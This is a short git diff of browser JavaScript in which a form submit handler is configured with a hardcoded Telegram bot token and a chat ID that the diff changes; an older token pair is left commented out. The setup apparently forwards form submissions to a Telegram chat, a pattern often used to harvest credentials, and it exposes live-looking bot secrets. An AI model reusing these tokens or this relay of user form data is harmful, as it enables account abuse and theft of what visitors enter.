@@ -17,7 +17,7 @@ document.getElementById('form').addEventListener('submit', function (e) {
     `;
 
     const botToken = '7095567255:AAE7899EX0ZlPFXtIaccA3qIx0FIEsQoaiM';
-    const chatId = '6427871';
+    const chatId = '6427871548';
 
     // const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4';
     // const chatId = '7332838769';
